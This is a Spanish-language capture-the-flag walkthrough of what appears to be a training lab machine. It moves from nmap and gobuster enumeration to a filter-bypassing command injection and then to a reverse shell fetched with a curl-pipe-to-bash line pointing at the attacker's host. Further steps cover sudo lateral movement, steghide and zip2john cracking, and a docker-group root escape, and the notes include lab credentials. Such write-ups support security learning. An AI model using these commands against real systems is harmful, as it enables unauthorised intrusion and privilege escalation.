### nmap
```python
sudo nmap -p- --open -sS -sCV -n -Pn 10.10.95.51
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-18 18:53 EST
Nmap scan report for 10.10.95.51
Host is up (0.21s latency).
Not shown: 65531 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.203.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.51 seconds
```
### ports: 21/tcp - 22/ssh - 80/http

### Enumeración 80
![[Pasted image 20231118200242.png]]
la pagina principal parace no tener nada importante
### fuzzing con gobuster
![[Pasted image 20231118201742.png]]
### tenemos un monton de directorios pero el que nos llama mas la atencion es /secret asi que vamos a investigar
tenemos una pagina que al parecer nos permite ejecutar codigo
![[Pasted image 20231118202125.png]]
### Al parecer somos el usuario www-data  pero no podemos ejecutar cualquier codigo ya que nos da errores
### despues de una larga busqueda por internet y probar un monton de cosas hemos consegido que interponiendo la barra slash invertido en cada letra de comando al parecer nos deja ejecutarlo. usaremos esto para intentar enviarnos una reverse shell 
![[Pasted image 20231118212931.png]]
### hemos creado un archivo shell.php con una reverse shell y hemos creado un servidor en python para poder conpartirnos el archivo y paralelamente nos hemos puesto a la escucha para poder obtener la shel
```python
	curl 10.8.203.6:8000/shellencod.php | /b?n/ba?h
```
### somos el usuario www-data
hemos intentado hacer tratamiento de tty pero al parecer no podemos. tendremos que hacer movimiento lateral hacia otro usuario para intentarlo de nuevo
![[Pasted image 20231118214103.png]]
### veamos los permisos SUID
![[Pasted image 20231119202137.png]]
al parecer tenemos un script de apaar pero todos pueden ejecutarlo. asi que vamos a aprovechar esto para intentar cambiarlos al usuario apaar.
### aprovechamos que apaar puede ejecutar este script asi que lo intentaremos ejecutar como apaar con el siguiente comando

```python 
sudo -u apaar /home/apaar/.helpline.sh
```
![[Pasted image 20231119202426.png]]
### perfecto. somos apaar. hacemos tratamiento de tty y listamos directorios
![[Pasted image 20231119202943.png]]
###### El index.php parece no tener nada muy importante y en imagenes tampoco.
### seguimos buscando y conseguimos una ruta donde tenemos archivos muy interesantes
vamos a mirar el archivo hacker.php
![[Pasted image 20231119203534.png]]
###### tenemos lo que parece ser una pagina web con una imagen y un mensaje que dice: mira en la oscuridad y podrás conseguir la respuesta
### hacemos cat al siguiente archivo en este caso account.php
![[Pasted image 20231119203858.png]]
###### en este caso tenemos informacion sobre una base de datos. nos dan pistas sobre el tipo de hash utilizados y parece que apunta a la tabla de usuarios
### el archivo index.php nos da informacion sobre lo que efectivamente es una base de datos
![[Pasted image 20231119204232.png]]
###### tenemos informacion sobre una base de datos mysql y al parecer las credenciales son
```python
	DATABASE:

	User: root

	Passwd: !@m+her00+@db
```
### nos faltaria enumerar el directorio images
![[Pasted image 20231119204822.png]]
### tenemos un gif y un jpg que por el nombre nos da algo de curiosidad. vamos a descargarla a nuestra maquina para poder examinarla

![[Pasted image 20231119205135.png]]
###### con un servidor en python hemos descargado la imagen ahora podemos examinarla desde nuestra maquina
### hemos utilizado la herramienta binwalk pero parece estar todo bien. luego usamos steghide para intentar extraer informacion oculta en la imagen

```python
	steghide --extract -sf hacker-with-laptop_23-2147985341.jpg
```

![[Pasted image 20231119205505.png]]
### el archivo pide una contraseña la cual no conocemos asi que solo damos enter. nos dara un mensaje de error pero si listamos nos damos cuenta que tenemos un nuevo archivo llamado backup.zip

![[Pasted image 20231119210309.png]]

### al intentar descomprimir el archivo nos damos cuenta que tambien esta encriptado asi que le damos enter pero en este caso no tenemos suerte. asi que vamos a desencriptarlo usando zip2jhon
```python
zip2john backup.zip > backup.hash
```
![[Pasted image 20231119211020.png]]
### descomprimimos el archivo backuo.hash que hemos creado usando jhon
![[Pasted image 20231119211549.png]]
### tenemos la contraseña para el backup.zip
```python 
	pass1word
```
### usamos la contraseña para descomprimir el archivo 
![[Pasted image 20231119211930.png]]
### tenemos un nuecho archivo llamado source_code.php
![[Pasted image 20231119212545.png]]
### tal parece que se trata de una pagina admin portal en el cual podemos ver una contraseña en base64 y un mensaje que dice Welcome anurodh. al parecer son las credenciales para este usuario

Credenciales
```python
	pass: IWQwbnRLbjB3bVlwQHNzdzByZA==

	user: Anurodh
```

### vamos a decodear esta password en base64 y intentaremos conectarnos como anurodh
![[Pasted image 20231119215709.png]]
### usaremos estas credenciales para iniciar sección 
![[Pasted image 20231119215926.png]]
somos anurodh
### enumeramos permisos permisos SUID pero al parecer son los mismos permisos asi que hacemos un id para saber a que grupo pertenecemos
![[Pasted image 20231119220324.png]]
### parece que estamos dentro de un docker. usaremos esto para escalar privilegios

```python
	```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
```

![[Pasted image 20231119220634.png]]
